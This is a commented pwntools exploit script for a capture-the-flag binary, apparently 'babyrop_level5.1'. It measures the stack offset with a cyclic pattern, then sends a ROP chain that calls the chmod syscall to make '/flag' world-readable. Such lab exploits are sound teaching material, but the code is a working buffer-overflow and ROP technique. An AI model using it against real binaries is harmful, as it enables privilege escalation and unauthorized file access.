#!usr/bin/python3
from pwn import *

# Setup the machine architecture
context.arch = "amd64"

# Retrieve the ELF information from the binary
elf = ELF("/challenge/babyrop_level5.1")

# Initialize the ROP module
rop = ROP(elf)

# Run the program
io = elf.process(setuid=False)

# Build and send the payload to the program
# NOTE: cyclic function setup a pattern payload that with
#       cyclic_find can be used to retrieve the distance
#       between buffer and return address
io.sendline(cyclic(512, n=8))
io.wait()
buff_length = cyclic_find(io.corefile.fault_addr, n=8)

# Because we don't know the address of the buffer we retrieve the address
# of the string we use as symbolic link with the "/flag" file, in order
# to change the permission on it.
# NOTE: elf.search('Leaving!') returns an iterator that gives the address
#       of the specified symbol.
# NOTE: we can retrieve the address analyzing the binary with GDB or Ghidra.
symlink_addr = p64(next(elf.search('Leaving!'))) #0x00402004

# Run the program another time
io = elf.process()

# Build the rop chain in order to:
# - Setup the rax register with the "chmod" system call number
# - Setup the rdi register with the name of the file (1st parameter)
# - Setup the rsi register with the flags to set (2nd parameter)
# - Execute syscall
CHAIN = p64(rop.rax.address) + p64(0x5A) +\
    p64(rop.rdi.address) + symlink_addr +\
    p64(rop.rsi.address) + p64(0o777) +\
    p64(rop.syscall.address)

# Setup the file name
filename = b'/flag\x00'

# Build and send the payload to the program
PAYLOAD = filename + b'A'*(buff_length - len(filename)) + CHAIN
io.sendline(PAYLOAD)

# Print the output of the program
print(io.recvall().decode(errors='ignore'))